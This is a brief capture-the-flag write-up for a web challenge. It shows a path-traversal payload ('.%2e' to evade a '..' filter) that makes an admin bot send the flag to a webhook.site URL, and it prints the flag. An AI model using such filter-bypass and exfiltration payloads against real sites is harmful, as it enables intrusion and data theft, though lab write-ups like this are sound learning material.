Still simple, i think? Anyway, we have 2 websites:
- https://chained.tjc.tf/
- https://admin-bot.tjctf.org/chained

The first one allow us to submit a URL and let the bot visit, but it has filters:
<img width="1308" height="89" alt="image" src="https://github.com/user-attachments/assets/7a1fdc98-f3be-4df0-914d-f915dc736bc1" />

The second website allow us to send an URL started with https://chained.tjc.tf/admin/
Here is the source code:
<img width="979" height="509" alt="image" src="https://github.com/user-attachments/assets/d23c6247-57ef-42de-b874-079e06b9cdfb" />

We know that flag will be loaded when we submit URL and the only way to leak the flag is fetch

If we submit an URL in the first website, the URL will beocome like this:
<img width="920" height="499" alt="image" src="https://github.com/user-attachments/assets/1744cc21-e5ea-4cba-b7b6-a4f5eee17b55" />

So we can use it to fetch the flag to our site.

The idea here is that, i submit https://chained.tjc.tf/?url=mywebsite in https://admin-bot.tjctf.org/chained.
But it must be started with https://chained.tjc.tf/admin/ so i will use path traversal like: https://chained.tjc.tf/admin/../?url=mywebsite?

But it filter '..' and '%2e%2e' so i use '.%2e'

I use webhook as my website so the payload will become: https://chained.tjc.tf/admin/.%2e/?url=https://webhook.site/2138b562-f58f-4601-92a0-57cca2889cb9?

Submit it and my webhook has request with the flag:
<img width="1607" height="571" alt="image" src="https://github.com/user-attachments/assets/357d3355-9adf-4c59-9c64-b5dfcb6f536b" />

Flag: tjctf{ch41n3d_o340e934l35d}

<img width="917" height="437" alt="image" src="https://github.com/user-attachments/assets/fd61b048-c106-4f6b-99c9-a60615fe581c" />
